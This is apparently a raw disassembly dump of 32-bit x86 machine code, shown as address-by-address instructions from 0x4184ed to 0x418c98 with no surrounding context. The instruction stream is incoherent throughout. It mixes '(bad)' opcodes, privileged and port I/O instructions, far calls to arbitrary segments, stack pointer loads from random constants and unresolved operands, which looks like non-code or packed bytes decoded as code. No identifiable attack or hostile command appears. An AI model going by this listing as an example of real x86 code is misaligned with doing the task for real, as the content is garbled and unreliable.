  4184ed:	mov    ecx,DWORD PTR [ecx+0x2a40665d]
  4184f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184f4:	jecxz  0x418483
  4184f6:	lds    esp,FWORD PTR ds:0x3a01f72b
  4184fc:	add    edi,ebx
  4184fe:	retf   0xd8fc
  418501:	jo     0x418498
  418503:	xchg   esp,eax
  418504:	xchg   ebp,eax
  418505:	rcr    bl,0xb8
  418508:	cmp    cl,0xc6
  41850b:	in     eax,dx
  41850c:	lds    edx,FWORD PTR [esi]
  41850e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41850f:	adc    dl,BYTE PTR [edx]
  418511:	xchg   ebx,eax
  418512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418513:	sbb    eax,0xf45629a0
  418518:	xor    al,BYTE PTR [edx]
  41851a:	fs into 
  41851c:	adc    dl,BYTE PTR [edi]
  41851e:	stos   DWORD PTR es:[edi],eax
  41851f:	push   esp
  418520:	mov    esp,0xdc284d84
  418525:	or     al,BYTE PTR [edx+0x2a]
  418528:	lea    esp,[edx-0x2b]
  41852b:	mov    esp,0x8a59b684
  418530:	xchg   edx,eax
  418531:	and    al,0xf3
  418533:	out    dx,eax
  418534:	pop    edi
  418535:	das    
  418536:	test   eax,0xe4821af5
  41853b:	daa    
  41853c:	sbb    dh,bh
  41853e:	push   ecx
  41853f:	lods   al,BYTE PTR ds:[esi]
  418540:	mov    DWORD PTR [ecx-0x1d5c599e],eax
  418546:	pop    esp
  418547:	cmp    DWORD PTR [ebp-0x4d],eax
  41854a:	ss das 
  41854c:	ss hlt 
  41854e:	bound  esi,QWORD PTR [esi-0xedac752]
  418554:	mov    BYTE PTR [ebp-0x40dd1d41],al
  41855a:	jecxz  0x418555
  41855c:	int3   
  41855d:	push   esp
  41855e:	scas   eax,DWORD PTR es:[edi]
  41855f:	call   0xff1c:0x3b0d688a
  418566:	dec    eax
  418567:	xchg   DWORD PTR [edx],edx
  418569:	sub    al,0x7f
  41856b:	fist   WORD PTR [eax+ecx*8+0x11df60bc]
  418572:	pop    esp
  418573:	cmp    al,0xb0
  418575:	aaa    
  418576:	arpl   WORD PTR [esi],sp
  418578:	jnp    0x418501
  41857a:	push   0xffffff99
  41857c:	pop    ecx
  41857d:	sbb    DWORD PTR [edi+0x4f],ecx
  418580:	(bad)  
  418581:	jge    0x4185ae
  418583:	mov    al,0xb4
  418585:	clc    
  418586:	pop    ebx
  418587:	(bad)  
  418588:	aad    0x44
  41858a:	sti    
  41858b:	adc    DWORD PTR ds:0xc85a71f4,eax
  418591:	jl     0x418529
  418593:	ds dec edx
  418595:	loopne 0x418590
  418597:	cdq    
  418598:	fs push es
  41859a:	ret    0xc5e3
  41859d:	arpl   WORD PTR [esi+ecx*8-0x13],si
  4185a1:	mov    edx,0x1a2c86fe
  4185a6:	xchg   ebx,eax
  4185a7:	jecxz  0x41858d
  4185a9:	popa   
  4185aa:	js     0x41853f
  4185ac:	mov    bh,0x9f
  4185ae:	mov    cl,0xce
  4185b0:	fwait
  4185b1:	push   cs
  4185b2:	jmp    0xc8abd24c
  4185b7:	mov    edx,0x3e511f9c
  4185bc:	sub    BYTE PTR [esp+eiz*2],ah
  4185bf:	sahf   
  4185c0:	cmp    esp,0xffffffbf
  4185c3:	iret   
  4185c4:	xor    DWORD PTR [eax+edi*2-0x4b],0xffffffac
  4185c9:	mov    ds:0x9cf8fcca,eax
  4185ce:	mov    ebp,edi
  4185d0:	fiadd  DWORD PTR [esi+0x4b301ce2]
  4185d6:	sbb    eax,0x6a6714b9
  4185db:	out    dx,eax
  4185dc:	lahf   
  4185dd:	shl    BYTE PTR [ebx],cl
  4185df:	mov    WORD PTR [esi],es
  4185e1:	jp     0x418619
  4185e3:	data16 int3 
  4185e5:	(bad)  
  4185e6:	push   cs
  4185e7:	aaa    
  4185e8:	pop    ebx
  4185e9:	out    dx,eax
  4185ea:	pop    edi
  4185eb:	sub    esi,edi
  4185ed:	lahf   
  4185ee:	adc    ch,BYTE PTR [ecx-0x1aa1db12]
  4185f4:	outs   dx,DWORD PTR ds:[esi]
  4185f5:	shl    ecx,0x92
  4185f8:	cmp    ebx,ebx
  4185fa:	repz sahf 
  4185fc:	in     eax,0xac
  4185fe:	push   ebp
  4185ff:	rol    BYTE PTR [ebx],cl
  418601:	push   es
  418602:	pusha  
  418603:	mov    al,0xca
  418605:	push   es
  418606:	repnz mov ecx,0xd8c879ea
  41860c:	(bad)  
  41860d:	or     DWORD PTR ss:[edx+eax*4],esi
  418611:	xor    BYTE PTR [edi-0x2f31e102],al
  418617:	adc    esp,ebx
  418619:	jmp    0xea703794
  41861e:	fdiv   st,st(6)
  418620:	jmp    0x418618
  418622:	pushf  
  418623:	inc    esi
  418624:	or     DWORD PTR [edi+0x42],eax
  418627:	pop    esp
  418628:	sub    eax,0xb7e2e9d2
  41862d:	cmp    DWORD PTR [edi],edi
  41862f:	mov    WORD PTR [esi],?
  418631:	loop   0x4185c8
  418633:	out    dx,al
  418634:	inc    ecx
  418635:	jns    0x418622
  418637:	inc    edi
  418638:	jns    0x418676
  41863a:	data16 cld 
  41863c:	jl     0x418632
  41863e:	mov    al,ds:0xd66260c8
  418643:	nop
  418644:	xor    esi,DWORD PTR [eax-0x18d6f9c]
  41864a:	ror    DWORD PTR [ecx],cl
  41864c:	ret    0xf05f
  41864f:	fwait
  418650:	jnp    0x4185de
  418652:	hlt    
  418653:	cmp    BYTE PTR [bp-0x79],cl
  418657:	dec    ecx
  418658:	adc    esp,DWORD PTR [edx-0x1a576baa]
  41865e:	daa    
  41865f:	adc    eax,0x8f6431bd
  418664:	mov    ds:0x6254e818,eax
  418669:	les    ebx,FWORD PTR [ecx-0x21]
  41866c:	or     ah,BYTE PTR [ebx-0x34]
  41866f:	cmp    al,0x60
  418671:	mov    bh,0x8e
  418673:	lahf   
  418674:	sbb    ecx,DWORD PTR [ecx]
  418676:	jae    0x4186e6
  418678:	pop    ecx
  418679:	test   DWORD PTR [ebp-0x6b4e33f0],eax
  41867f:	push   0xa2d38d5f
  418684:	pop    ecx
  418685:	mov    al,0x59
  418687:	dec    ebx
  418688:	mov    ebx,0xc313a45d
  41868d:	and    al,0x29
  41868f:	sub    eax,0x3f5f0eef
  418694:	test   eax,0x9226ade4
  418699:	outs   dx,DWORD PTR ds:[esi]
  41869a:	retf   
  41869b:	mov    bh,0x7d
  41869d:	xor    dh,BYTE PTR [ebx-0x6551b036]
  4186a3:	fdivr  DWORD PTR [eax-0x31781ec9]
  4186a9:	in     al,0x8c
  4186ab:	jo     0x41865a
  4186ad:	push   eax
  4186ae:	sbb    edi,DWORD PTR [edx-0x37]
  4186b1:	or     eax,esi
  4186b3:	(bad)  
  4186b4:	sahf   
  4186b5:	pusha  
  4186b6:	inc    ebx
  4186b7:	jp     0x4186e0
  4186b9:	cmp    BYTE PTR [esi-0x711b7771],bh
  4186bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186c0:	out    0xb,eax
  4186c2:	and    ah,BYTE PTR [ecx]
  4186c4:	cmp    dl,bl
  4186c6:	inc    ebp
  4186c7:	cmp    BYTE PTR [eax-0x2eb7b07c],ch
  4186cd:	pusha  
  4186ce:	imul   ecx,DWORD PTR [esi],0xffffffa6
  4186d1:	push   es
  4186d2:	and    dl,0x9d
  4186d5:	xchg   ecx,eax
  4186d6:	imul   esp,DWORD PTR [eax+ebp*4-0x285178ba],0xc2f7bbb7
  4186e1:	retf   0x8aa8
  4186e4:	xchg   edx,eax
  4186e5:	test   ebx,eax
  4186e7:	cli    
  4186e8:	mov    dl,dh
  4186ea:	cmp    DWORD PTR [edi+edx*4-0x179b6192],ebx
  4186f1:	addr16 push 0xffffffeb
  4186f4:	pop    esi
  4186f5:	imul   esi,edx,0x2a
  4186f8:	stos   DWORD PTR es:[edi],eax
  4186f9:	test   al,0x9a
  4186fb:	push   edi
  4186fc:	inc    ebx
  4186fd:	jp     0x4186ab
  4186ff:	fld    TBYTE PTR [eax+edi*1]
  418702:	push   es
  418703:	cmp    DWORD PTR [eax+0x13],edi
  418706:	fisubr WORD PTR [edx]
  418708:	ss xchg edx,eax
  41870a:	fwait
  41870b:	xchg   ebx,eax
  41870c:	mov    eax,edi
  41870e:	lods   al,BYTE PTR ds:[esi]
  41870f:	and    eax,0x48675b91
  418714:	jp     0x4186e2
  418716:	jnp    0x418731
  418718:	(bad)  
  418719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41871a:	aam    0x81
  41871c:	je     0x4186ef
  41871e:	cwde   
  41871f:	pop    ss
  418720:	call   0x2d9:0x6cb158ca
  418727:	sar    BYTE PTR [ebp+0x38443808],0x27
  41872e:	sysexit 
  418730:	inc    eax
  418731:	iret   
  418732:	pop    esi
  418733:	dec    ebx
  418734:	mov    esp,0xefaa89c5
  418739:	add    eax,0x972636b2
  41873e:	jae    0x4186fa
  418740:	push   ecx
  418741:	mov    ds:0x9e047aef,al
  418746:	push   ds
  418747:	ins    BYTE PTR es:[edi],dx
  418748:	and    BYTE PTR [edx],al
  41874a:	xchg   edx,eax
  41874b:	mov    bh,0xbf
  41874d:	push   ebp
  41874e:	jge    0x418768
  418750:	lods   al,BYTE PTR ds:[esi]
  418751:	add    DWORD PTR [edi+eiz*8+0xb899f83],ebp
  418758:	cs jl  0x4187bc
  41875b:	dec    eax
  41875c:	lods   al,BYTE PTR ds:[esi]
  41875d:	mov    eax,0xe1336227
  418762:	sub    eax,DWORD PTR [ecx+esi*2-0x6d5b9a6d]
  418769:	push   cs
  41876a:	push   0xfffffff8
  41876c:	mov    ah,0x30
  41876e:	in     al,0x2e
  418770:	enter  0xd7e0,0x8b
  418774:	push   0xc0d1a523
  418779:	dec    esp
  41877a:	enter  0x743e,0xbf
  41877e:	inc    esi
  41877f:	and    eax,0xc2124cd
  418784:	pop    edx
  418785:	push   edx
  418786:	xlat   BYTE PTR ds:[ebx]
  418787:	mov    bl,0xed
  418789:	daa    
  41878a:	fnstcw WORD PTR [ebx]
  41878c:	repz push ss
  41878e:	leave  
  41878f:	cmp    ebp,eax
  418791:	inc    eax
  418792:	mov    dh,0xa5
  418794:	mov    ?,WORD PTR [edi]
  418796:	jmp    0x33c1:0xf712247e
  41879d:	(bad)  
  41879f:	mov    ebx,0x653bdb25
  4187a4:	gs dec edx
  4187a6:	sti    
  4187a7:	repz cmp edi,DWORD PTR [esi-0x2c]
  4187ab:	cmp    eax,0x3c25d72b
  4187b0:	repz and ebp,DWORD PTR [esi]
  4187b3:	aam    0xc
  4187b5:	cld    
  4187b6:	xchg   edx,eax
  4187b7:	add    DWORD PTR [esi-0x48d182b3],ecx
  4187bd:	pop    ds
  4187be:	stos   BYTE PTR es:[edi],al
  4187bf:	aad    0x35
  4187c1:	push   edi
  4187c2:	mov    esi,0x5fb32e43
  4187c7:	inc    esi
  4187c8:	lea    edx,[ebx+eiz*4]
  4187cb:	and    eax,0x94622925
  4187d0:	lds    ecx,FWORD PTR [esi-0x6]
  4187d3:	cmp    bl,BYTE PTR [ebp+0x0]
  4187d6:	jo     0x4187b1
  4187d8:	sub    edi,DWORD PTR [eax]
  4187da:	xchg   edi,eax
  4187db:	sti    
  4187dc:	inc    edx
  4187dd:	push   ebp
  4187de:	pop    edi
  4187df:	mov    edx,0xb0b3a753
  4187e4:	mov    esi,0xc582b579
  4187e9:	fsubr  DWORD PTR [ecx]
  4187eb:	push   edx
  4187ec:	xlat   BYTE PTR ds:[ebx]
  4187ed:	jl     0x418846
  4187ef:	cs jns 0x418804
  4187f2:	pop    ax
  4187f4:	mov    al,ds:0xae7d7ba5
  4187fa:	mov    ch,0x43
  4187fc:	inc    esi
  4187fd:	cdq    
  4187fe:	sub    cl,BYTE PTR [ebx+0x996ec28]
  418804:	scas   al,BYTE PTR es:[edi]
  418805:	push   0xffffff8d
  418807:	or     esp,DWORD PTR [esi-0x10]
  41880a:	mov    al,ds:0x8f70ff1a
  41880f:	je     0x418890
  418811:	sub    eax,0x75670411
  418816:	mov    bl,0x53
  418818:	scas   eax,DWORD PTR es:[edi]
  418819:	mov    ds:0x94a66d93,al
  41881e:	mov    DWORD PTR fs:[eax],edi
  418821:	sbb    DWORD PTR [ebx+ebx*4-0x54],esi
  418825:	mov    eax,0xd48b5360
  41882a:	inc    ebp
  41882b:	and    BYTE PTR [eax],bl
  41882d:	in     eax,0x56
  41882f:	sti    
  418830:	sbb    eax,0x742ecde1
  418835:	inc    eax
  418836:	pop    ebp
  418837:	and    DWORD PTR [ecx-0x7d],ebp
  41883a:	mov    ebx,0x5c1e2839
  41883f:	in     al,0x48
  418841:	cmp    BYTE PTR ds:0x66251df4,dh
  418847:	leave  
  418848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418849:	or     BYTE PTR [ebp-0x11],0x22
  41884d:	push   ds
  41884e:	xchg   esi,eax
  41884f:	and    BYTE PTR [ecx+0x48],ah
  418852:	pop    edi
  418853:	retf   
  418854:	xchg   ecx,eax
  418855:	sbb    ah,al
  418857:	inc    edi
  418858:	or     esp,DWORD PTR [edi-0x40]
  41885b:	push   esp
  41885c:	ja     0x4188dd
  41885e:	sbb    ebp,ebp
  418860:	stos   DWORD PTR es:[edi],eax
  418861:	mov    bl,0x67
  418863:	mov    ebx,0xf89aa094
  418868:	mov    edi,0xdb4c1e6
  41886d:	mov    WORD PTR [eax+0x39a5c959],fs
  418873:	push   es
  418874:	add    BYTE PTR [ecx],0x1e
  418877:	jbe    0x41883d
  418879:	dec    eax
  41887a:	(bad)  
  41887b:	mov    ds:0x3957fe39,eax
  418880:	push   esp
  418881:	lahf   
  418882:	stos   BYTE PTR es:[edi],al
  418883:	push   ds
  418884:	not    BYTE PTR [esi-0xf]
  418887:	xchg   esp,eax
  418888:	test   eax,0x73ffb991
  41888d:	push   cs
  41888e:	call   0x3ce0:0x9b631839
  418895:	push   ss
  418896:	or     BYTE PTR [ecx-0x42970ac],ah
  41889c:	or     al,0x4c
  41889e:	mov    DWORD PTR [esi+ebx*8+0x290c26d2],eax
  4188a5:	push   ecx
  4188a6:	inc    eax
  4188a7:	add    edx,DWORD PTR [esi+0x3b]
  4188aa:	jae    0x4188c8
  4188ac:	gs dec esp
  4188ae:	in     al,dx
  4188af:	pop    ebx
  4188b0:	jg     0x418928
  4188b2:	mov    esp,0xb5cb34a3
  4188b7:	jl     0x418920
  4188b9:	(bad)  
  4188ba:	sbb    DWORD PTR [ebp+edx*4+0x2c],edi
  4188be:	imul   DWORD PTR ds:0x452ace96
  4188c4:	mov    DWORD PTR [edx],ebx
  4188c6:	out    0xb,eax
  4188c8:	cwde   
  4188c9:	iret   
  4188ca:	mov    eax,0x296a69c9
  4188cf:	inc    edx
  4188d0:	dec    ebx
  4188d1:	out    dx,eax
  4188d2:	xor    BYTE PTR [edx+0x76],ch
  4188d5:	arpl   WORD PTR [eax-0x1c],ax
  4188d8:	call   0xa538:0x98f191bc
  4188df:	imul   ebp,eax,0xa82ba741
  4188e5:	cmp    al,0x65
  4188e7:	repz gs and eax,0xa13ebd5e
  4188ee:	mov    edi,0xb4b0cf1c
  4188f3:	nop
  4188f4:	dec    ebx
  4188f5:	adc    BYTE PTR [eax],cl
  4188f7:	push   0xffffffee
  4188f9:	mov    esi,0x9c132b68
  4188fe:	fwait
  4188ff:	and    esp,DWORD PTR [ebx+edi*4+0x21364e66]
  418906:	dec    ebp
  418907:	popa   
  418908:	sbb    ebx,DWORD PTR [esi]
  41890a:	ss cld 
  41890c:	jl     0x41894a
  41890e:	xchg   esi,eax
  41890f:	sub    esi,DWORD PTR [ecx+0x6a6b3ad6]
  418915:	mov    BYTE PTR [eax-0x30],bh
  418918:	inc    ecx
  418919:	pop    ebx
  41891a:	ret    0x566e
  41891d:	jo     0x4188eb
  41891f:	in     al,dx
  418920:	test   bl,al
  418922:	ins    DWORD PTR es:[edi],dx
  418923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418924:	pop    esp
  418925:	pusha  
  418926:	call   DWORD PTR [edi+ecx*1]
  418929:	xor    eax,0x39f50adb
  41892e:	xchg   edx,eax
  41892f:	addr16 pop ecx
  418931:	xchg   esi,eax
  418932:	pusha  
  418933:	sahf   
  418934:	dec    ebx
  418935:	bound  edx,QWORD PTR [ebx]
  418937:	inc    edx
  418938:	iret   
  418939:	psrld  mm1,QWORD PTR [ebp+0x60]
  41893d:	sti    
  41893e:	xor    dh,BYTE PTR [ebx-0x24]
  418941:	jb     0x41893d
  418943:	cwde   
  418944:	xchg   ecx,eax
  418945:	push   ebp
  418946:	psubusw mm7,QWORD PTR ds:0xf3a4bf83
  41894e:	movq   mm7,QWORD PTR [edi]
  418951:	xor    bh,BYTE PTR [esi]
  418953:	mov    ds:0x47d09b22,eax
  418958:	mov    al,ds:0xbc126af6
  41895d:	lea    esi,[edx]
  41895f:	mov    esp,DWORD PTR [esi+0x1]
  418962:	inc    edx
  418963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418964:	add    BYTE PTR [ebx],bh
  418966:	or     eax,esi
  418968:	lahf   
  418969:	in     eax,0x1e
  41896b:	lahf   
  41896c:	outs   dx,BYTE PTR ds:[esi]
  41896d:	lods   eax,DWORD PTR ds:[esi]
  41896e:	cmp    eax,0xd042a2cb
  418973:	loop   0x41895d
  418975:	sar    edx,1
  418977:	or     eax,esp
  418979:	pop    ss
  41897a:	or     ch,ch
  41897c:	rol    al,0x94
  41897f:	sub    esi,DWORD PTR [edx+0x48da1d42]
  418985:	repz loope 0x418984
  418988:	inc    esp
  418989:	ror    eax,1
  41898b:	pop    ss
  41898c:	jbe    0x418927
  41898e:	test   eax,0x6dabfbba
  418993:	sub    al,0x61
  418995:	enter  0x6765,0x9d
  418999:	sub    DWORD PTR [eax],0x18
  41899c:	jno    0x418944
  41899e:	loope  0x41898b
  4189a0:	out    dx,eax
  4189a1:	icebp  
  4189a2:	xchg   eax,edx
  4189a4:	cmc    
  4189a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189a6:	mov    al,0xf1
  4189a8:	and    dh,BYTE PTR [ebx+0x4d]
  4189ab:	or     bh,BYTE PTR [eax+0x13]
  4189ae:	mov    edi,0xad9ff180
  4189b3:	imul   ecx,DWORD PTR [ecx+0x375d03b9],0x2dd4e553
  4189bd:	test   al,0xc3
  4189bf:	and    dh,dl
  4189c1:	ja     0x418989
  4189c3:	jne    0x418a42
  4189c5:	(bad)  [eax]
  4189c7:	retf   0x5d0f
  4189ca:	sbb    BYTE PTR [eax-0x4e],al
  4189cd:	lods   al,BYTE PTR ds:[esi]
  4189ce:	(bad)  
  4189cf:	stos   BYTE PTR es:[edi],al
  4189d0:	mov    esi,es
  4189d2:	cli    
  4189d3:	mov    BYTE PTR [ebp+0x44c881fb],0xb3
  4189da:	sbb    BYTE PTR [ecx-0x3b3eebd9],bl
  4189e0:	mov    al,0x2e
  4189e2:	imul   edi,DWORD PTR [eax],0xffffff97
  4189e5:	sub    BYTE PTR [edi+ecx*4],ah
  4189e8:	mov    bl,0x7d
  4189ea:	mov    ah,0xc5
  4189ec:	adc    bl,BYTE PTR [edx+0x4]
  4189ef:	lahf   
  4189f0:	ret    
  4189f1:	aas    
  4189f2:	call   0x462f06ee
  4189f7:	jns    0x418a4b
  4189f9:	loope  0x418a37
  4189fb:	mov    fs,WORD PTR [edx+0x76813aad]
  418a01:	ror    BYTE PTR [ebx-0x13],1
  418a04:	mov    ebp,esi
  418a06:	rol    bl,0xce
  418a09:	sbb    esp,eax
  418a0b:	mov    WORD PTR [eax+0x3cb122cf],ss
  418a11:	fcomp  QWORD PTR [ecx+0x68d52fd7]
  418a17:	pop    ss
  418a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a19:	pop    esp
  418a1a:	add    esp,esp
  418a1c:	push   0x16ee2438
  418a21:	push   es
  418a22:	jnp    0x4189aa
  418a24:	dec    eax
  418a25:	pop    ebp
  418a26:	daa    
  418a27:	xlat   BYTE PTR ds:[ebx]
  418a28:	mov    ecx,esi
  418a2a:	test   DWORD PTR [esi],ebx
  418a2c:	inc    ebp
  418a2d:	btr    ebx,ecx
  418a30:	aaa    
  418a31:	xor    dl,dl
  418a33:	xchg   ebx,eax
  418a34:	scas   al,BYTE PTR es:[edi]
  418a35:	iret   
  418a36:	in     al,dx
  418a37:	cdq    
  418a38:	jmp    0x48799e8f
  418a3d:	mov    al,0x7e
  418a3f:	jge    0x418a6f
  418a41:	das    
  418a42:	aaa    
  418a43:	jno    0x418a56
  418a45:	push   esp
  418a46:	xlat   BYTE PTR ds:[ebx]
  418a47:	sbb    al,BYTE PTR [eax]
  418a49:	fnstenv [esi]
  418a4b:	stc    
  418a4c:	aaa    
  418a4d:	or     bh,BYTE PTR [edi]
  418a4f:	in     eax,0x8c
  418a51:	and    eax,0xe27346fd
  418a56:	sub    BYTE PTR [ecx],dl
  418a58:	sahf   
  418a59:	mov    BYTE PTR [ebp-0x4102fea7],ah
  418a5f:	or     eax,0x94def045
  418a64:	cmp    al,0xab
  418a66:	gs push 0x1fcd4b81
  418a6c:	cmp    ebp,esp
  418a6e:	wbinvd 
  418a70:	adc    DWORD PTR [esi],esp
  418a72:	mov    ebx,0x5675df6a
  418a77:	mov    eax,0x6009671e
  418a7c:	fwait
  418a7d:	scas   eax,DWORD PTR es:[edi]
  418a7e:	jns    0x418aec
  418a80:	add    DWORD PTR [ebp-0x444fc8ac],eax
  418a86:	mov    ebx,0xbbcd5c9
  418a8b:	enter  0x8373,0x7c
  418a8f:	or     BYTE PTR [ebx],0xb4
  418a92:	ins    DWORD PTR es:[edi],dx
  418a93:	outs   dx,DWORD PTR ds:[esi]
  418a94:	fst    QWORD PTR [edx-0x14]
  418a97:	pop    esp
  418a98:	sar    DWORD PTR es:0x494503f2,cl
  418a9f:	xchg   cl,cl
  418aa1:	ja     0x418a82
  418aa3:	cpuid  
  418aa5:	push   0x572120bb
  418aaa:	pop    edi
  418aab:	or     eax,0x5581553
  418ab0:	cmp    BYTE PTR [ecx],dh
  418ab2:	jns    0x418a58
  418ab4:	and    al,0xf1
  418ab6:	adc    DWORD PTR [eax],0x4c
  418ab9:	inc    ecx
  418aba:	imul   esi,esp,0x5c
  418abd:	popa   
  418abe:	push   ds
  418abf:	jecxz  0x418a82
  418ac1:	dec    esi
  418ac2:	or     cl,BYTE PTR [esi]
  418ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ac5:	ins    DWORD PTR es:[edi],dx
  418ac6:	(bad)  
  418ac7:	lds    ebx,FWORD PTR [esi-0x4e90e9b0]
  418acd:	pop    ebx
  418ace:	cmova  esp,DWORD PTR [esi+0x1d]
  418ad2:	sti    
  418ad3:	cwde   
  418ad4:	pop    esi
  418ad5:	pushf  
  418ad6:	push   ss
  418ad7:	mov    bh,0xd2
  418ad9:	dec    ebx
  418ada:	sti    
  418adb:	adc    dh,BYTE PTR [edx+0x10]
  418ade:	add    esi,DWORD PTR [edi+esi*1]
  418ae1:	lea    ebx,[edx+eax*4]
  418ae4:	sbb    eax,0x500fbfb8
  418ae9:	mov    eax,ds:0x637b9b67
  418aee:	jecxz  0x418b67
  418af0:	rcr    edx,cl
  418af2:	pop    edi
  418af3:	stos   BYTE PTR es:[edi],al
  418af4:	jle    0x418ae9
  418af6:	push   esi
  418af7:	in     eax,dx
  418af8:	test   DWORD PTR [edi],ebp
  418afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418afb:	add    BYTE PTR [ecx-0x4b],dl
  418afe:	clc    
  418aff:	imul   eax,ebx,0xffffffc2
  418b02:	scas   al,BYTE PTR es:[edi]
  418b03:	xor    al,0xa4
  418b05:	sbb    al,0x79
  418b07:	in     eax,dx
  418b08:	test   al,0x6b
  418b0a:	ja     0x418b6b
  418b0c:	jb     0x418b15
  418b0e:	mov    bh,0xbc
  418b10:	ins    DWORD PTR es:[edi],dx
  418b11:	std    
  418b12:	jo     0x418b66
  418b14:	jbe    0x418aaf
  418b16:	adc    BYTE PTR [edx-0x24e3180a],dl
  418b1c:	jae    0x418b31
  418b1e:	mov    ebx,0x1ea74591
  418b23:	xlat   BYTE PTR ds:[ebx]
  418b24:	stc    
  418b25:	add    dl,BYTE PTR [eax*8+0x430c635d]
  418b2c:	xor    ebx,esi
  418b2e:	jecxz  0x418b9e
  418b30:	out    dx,al
  418b31:	push   0x71
  418b33:	add    eax,0xbe6bee51
  418b38:	jmp    0x418ba2
  418b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b3b:	test   eax,0xb86acdf9
  418b40:	and    al,BYTE PTR [eax+ecx*4-0x52]
  418b44:	gs mov esp,0x3545dd74
  418b4a:	bound  edx,QWORD PTR [esi+0x5ee64987]
  418b50:	add    al,ah
  418b52:	fsub   QWORD PTR [edx+ecx*4-0x14]
  418b56:	rcr    DWORD PTR [eax-0x36ed2f2],cl
  418b5c:	push   ebp
  418b5d:	pop    ebp
  418b5e:	jmp    0x342e4145
  418b63:	mov    bh,0xea
  418b65:	sar    dh,0xd3
  418b68:	addr16 sub edx,edx
  418b6b:	add    eax,0x7a009ef9
  418b70:	and    BYTE PTR [ebp+0x36a15a66],ch
  418b76:	int    0x77
  418b78:	pop    esp
  418b79:	pop    ebx
  418b7a:	not    BYTE PTR [ecx+0x350d5af0]
  418b80:	retf   0x55b5
  418b83:	shl    DWORD PTR [ebx+0x6a],1
  418b86:	daa    
  418b87:	out    dx,al
  418b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b89:	push   0x72
  418b8b:	jl     0x418bb6
  418b8d:	mov    WORD PTR [edx+0x7d843bcd],gs
  418b93:	sbb    al,0x8f
  418b95:	in     al,dx
  418b96:	xchg   esp,eax
  418b97:	mov    al,0x8d
  418b99:	push   ebx
  418b9a:	jnp    0x418b70
  418b9c:	mov    dh,0x19
  418b9e:	gs jnp 0x33637ba9
  418ba5:	cmp    eax,0x82e83c6a
  418baa:	dec    edx
  418bab:	pop    eax
  418bac:	in     al,dx
  418bad:	adc    ebp,DWORD PTR [esi]
  418baf:	in     al,0x3f
  418bb1:	repnz leave 
  418bb3:	cld    
  418bb4:	pusha  
  418bb5:	pop    ss
  418bb6:	test   DWORD PTR [esi],eax
  418bb8:	in     eax,dx
  418bb9:	neg    DWORD PTR [ecx+0x519bc31e]
  418bbf:	imul   ecx,DWORD PTR [esi-0x26500a5d],0xd613154c
  418bc9:	ss iret 
  418bcb:	mov    ah,0x5f
  418bcd:	cwde   
  418bce:	stos   BYTE PTR es:[edi],al
  418bcf:	mov    ah,0xf9
  418bd1:	cdq    
  418bd2:	sar    DWORD PTR [edi-0x627b0272],cl
  418bd8:	adc    al,0xaa
  418bda:	mov    edi,0xf4c5000d
  418bdf:	jae    0x418bcc
  418be1:	or     eax,0x672f72a6
  418be6:	in     eax,dx
  418be7:	mov    dh,0xe7
  418be9:	(bad)  
  418bea:	fcom   DWORD PTR [edx+0x78]
  418bed:	inc    ebx
  418bee:	cmp    eax,0x7b021b7
  418bf3:	sub    eax,0xd3b19eb9
  418bf8:	outs   dx,DWORD PTR ds:[esi]
  418bf9:	hlt    
  418bfa:	pop    edx
  418bfb:	int    0x1b
  418bfd:	ret    0xbf50
  418c00:	(bad)  
  418c02:	dec    esp
  418c03:	adc    BYTE PTR [ebp-0x74753c4b],bl
  418c09:	scas   eax,DWORD PTR es:[edi]
  418c0a:	or     ch,ah
  418c0c:	lock std 
  418c0e:	int3   
  418c0f:	push   ds
  418c10:	mov    esp,ebx
  418c12:	add    eax,0x52fd429
  418c17:	jnp    0x418bf8
  418c19:	xor    al,BYTE PTR [eax+0x4a638b63]
  418c1f:	loop   0x418c29
  418c21:	popa   
  418c22:	int3   
  418c23:	and    eax,0xbb91ce2a
  418c28:	and    esi,DWORD PTR [esi]
  418c2a:	or     edi,DWORD PTR [eax]
  418c2c:	mov    bh,0xc2
  418c2e:	scas   al,BYTE PTR es:[edi]
  418c2f:	inc    eax
  418c30:	pusha  
  418c31:	push   cs
  418c32:	adc    al,0x7e
  418c34:	in     eax,0xf4
  418c36:	jo     0x418c70
  418c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c39:	test   edi,edx
  418c3b:	loope  0x418c8a
  418c3d:	cli    
  418c3e:	stos   BYTE PTR es:[edi],al
  418c3f:	clc    
  418c40:	mov    dh,0xe
  418c42:	not    BYTE PTR [esi-0x1c423dba]
  418c48:	pop    eax
  418c49:	inc    DWORD PTR [eax+0x23]
  418c4c:	jecxz  0x418c7a
  418c4e:	iret   
  418c4f:	xchg   BYTE PTR [ecx-0x6d],cl
  418c52:	mov    ds:0x738d7232,al
  418c57:	inc    ebx
  418c58:	and    eax,0xdd8b1bcb
  418c5d:	(bad)  
  418c5e:	jmp    0xb80c3e51
  418c63:	aaa    
  418c64:	push   ss
  418c65:	adc    DWORD PTR [ebp-0x3bcc77c],esp
  418c6b:	push   ebx
  418c6c:	pop    ebx
  418c6d:	or     DWORD PTR [ebp+0x27c079ad],esp
  418c73:	xchg   esp,eax
  418c74:	ficom  DWORD PTR [edi+ebx*4+0x6]
  418c78:	cmp    eax,0x7258ba5c
  418c7d:	fistp  WORD PTR [eax-0x42]
  418c80:	xchg   DWORD PTR [ebp+0x44c33172],eax
  418c86:	fwait
  418c87:	push   es
  418c88:	cwde   
  418c89:	mov    bh,0x5d
  418c8b:	push   esp
  418c8c:	pop    ebx
  418c8d:	sub    ah,BYTE PTR [esi+edx*1+0x7a8672d4]
  418c94:	push   edx
  418c95:	mov    bl,0xf7
  418c97:	inc    edx
  418c98:	mov    esp,DWORD PTR [ebx-0x46]
